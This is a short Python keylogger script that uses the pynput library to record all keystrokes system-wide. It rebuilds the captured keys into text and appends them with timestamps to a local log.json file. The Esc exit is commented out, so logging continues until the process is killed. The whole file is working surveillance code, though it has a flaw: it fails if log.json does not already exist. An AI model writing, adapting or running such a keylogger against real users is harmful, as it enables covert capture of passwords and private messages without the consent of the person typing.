import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime
import json

count, keys = 0, []

def on_press(key):
	global keys, count
	keys.append(key)
	count += 1

	if count > 50 and 'space' in str(keys[-1]):
		words = ''
		for key in keys:
			k = str(key).replace("'", '')
			if k.find('Key') == -1:
				words += k
			elif k.find('back') > 0:
				words += ' BACK '
			elif k.find('space') > 0:
				words += ' '
			elif k.find('enter') > 0:
				words += ' ENTER '

		date = datetime.now()
		write_log({date.strftime('%c'): words})
		count, keys = 0, []

def write_log(input_):
	with open("log.json") as read_log:
		try:
			temp_log = json.load(read_log)
			temp_log.update(input_)
		except:
			temp_log = input_
	with open("log.json", "w") as write_log:
		json.dump(temp_log, write_log)

def on_release(key):
	if key == Key.esc:
		pass #return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()